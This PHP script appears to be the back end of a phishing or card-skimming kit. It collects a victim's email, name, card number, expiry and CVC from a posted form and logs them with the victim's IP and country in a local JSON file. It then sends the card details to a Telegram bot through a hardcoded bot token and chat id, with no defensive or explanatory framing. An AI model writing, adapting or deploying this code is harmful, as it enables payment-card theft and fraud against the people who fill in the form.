<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("Location: index.php");
    exit;
}

$user_key = $_POST['user_key'] ?? '';
if (empty($user_key)) {
    header("Location: index.php");
    exit;
}

// Get form data
$formData = [
    'email' => $_POST['email'] ?? '',
    'name' => $_POST['name'] ?? '',
    'card' => $_POST['cardNumber'] ?? '',
    'expiry' => $_POST['cardExpiry'] ?? '',
    'cvc' => $_POST['cardCvc'] ?? '',
    'submitted_at' => time()
];

// Get country from IP
function getCountryFromIP($ip) {
    if ($ip === 'Unknown' || $ip === '127.0.0.1') {
        return 'Localhost';
    }
    
    // Try to get country using free IP API
    try {
        $response = @file_get_contents("http://ip-api.com/json/{$ip}");
        if ($response) {
            $data = json_decode($response, true);
            if ($data['status'] === 'success') {
                return $data['country'] . ' (' . $data['countryCode'] . ')';
            }
        }
    } catch (Exception $e) {
        // Fallback
    }
    
    return 'Unknown';
}

// Update database
$db_file = 'data/users.db';
$users = file_exists($db_file) ? json_decode(file_get_contents($db_file), true) : [];

if (isset($users[$user_key])) {
    $ip = $users[$user_key]['ip'] ?? 'Unknown';
    $country = getCountryFromIP($ip);
    
    $users[$user_key]['data'] = $formData;
    $users[$user_key]['country'] = $country;
    $users[$user_key]['status'] = 'loading';
    $users[$user_key]['current_page'] = 'loading.php';
    $users[$user_key]['last_seen'] = time();
    $users[$user_key]['last_updated'] = time();
    
    $users[$user_key]['history'][] = [
        'time' => time(),
        'action' => 'form_submitted',
        'page' => 'process.php',
        'details' => 'User submitted payment form'
    ];
} else {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $country = getCountryFromIP($ip);
    
    $users[$user_key] = [
        'id' => $user_key,
        'ip' => $ip,
        'country' => $country,
        'data' => $formData,
        'status' => 'loading',
        'current_page' => 'loading.php',
        'redirect_to' => '',
        'created_at' => time(),
        'last_seen' => time(),
        'last_updated' => time(),
        'history' => [
            [
                'time' => time(),
                'action' => 'user_created',
                'page' => 'process.php'
            ],
            [
                'time' => time(),
                'action' => 'form_submitted',
                'page' => 'process.php',
                'details' => 'User submitted payment form'
            ]
        ]
    ];
}

// Save to database
file_put_contents($db_file, json_encode($users, JSON_PRETTY_PRINT));

// Send Telegram notification
$bot_token = '8519765168:AAEJk6HCHDQY5fYAa2GfR5mzMrUxeSGPbF8';
$chat_id = '-5209514131';

$message = "📝 *FORM SUBMITTED*\n\n";
$message .= "🔑 *User ID:* `" . $user_key . "`\n";
$message .= "📧 *Email:* `" . ($formData['email'] ?: 'N/A') . "`\n";
$message .= "👤 *Name:* `" . ($formData['name'] ?: 'N/A') . "`\n";
$message .= "💳 *Card:* `" . ($formData['card'] ?: 'N/A') . "`\n";
$message .= "📍 *IP:* `" . ($users[$user_key]['ip'] ?? 'N/A') . "`\n";
$message .= "🌍 *Country:* `" . ($users[$user_key]['country'] ?? 'N/A') . "`\n";
$message .= "🕐 *Time:* " . date('H:i:s');

$url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
$context = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/json',
        'content' => json_encode([
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ]),
        'timeout' => 1
    ]
]);
@file_get_contents($url, false, $context);

// Redirect to loading page
header("Location: loading.php?user_key=" . urlencode($user_key));
exit;
?>
